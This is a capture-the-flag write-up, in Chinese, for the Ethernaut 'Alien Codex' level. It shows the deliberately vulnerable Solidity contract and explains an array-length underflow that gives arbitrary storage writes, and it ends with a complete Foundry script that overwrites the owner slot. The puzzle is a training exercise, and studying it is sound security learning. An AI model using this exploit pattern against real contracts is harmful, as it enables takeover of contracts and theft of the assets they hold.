# Ethernaut CTF Writeup

## Level 19 Alien Codex

> 題目: https://ethernaut.openzeppelin.com/level/0x734CfE306C0C4130051A194BA110BC808B13C439

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

過關條件: 

- 取得合約所有權

解法：

- 合約中存在一個允許修改任意儲存位置的漏洞
- 呼叫 `makeContact()`：將 contact 設為 true，允許我們呼叫其他函數
- 呼叫 `retract()`：使 codex 的長度減少1，並 underflow 到最大長度，從而允許我們訪問並修改任意儲存槽
- 計算索引：儲存槽 slot 0 是 owner 的地址，透過越界訪問，可計算出 owner 所在的儲存槽索引 (`i= 2^256 − keccak256(1)`)
- 使用 `revise()`，傳遞索引及新的 owner 地址，將 owner 更改為 `msg.sender`

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

interface IAlienCodex {

    function owner() external view returns (address);

    function makeContact() external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;

}

contract Attack is Script {
    IAlienCodex target = IAlienCodex(0x854fcd8eeC13A4E246fdb1da7268053D5b36CEe2);
    
    function run() public {
        vm.startBroadcast();
        // step 1
        target.makeContact();
        // step 2
        target.retract();
        // step 3
        uint256 n = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i; // index
        unchecked { i -= n; }
        // step 4
        target.revise(i, bytes32(uint256(uint160(msg.sender))));

        vm.stopBroadcast();
    }
}
```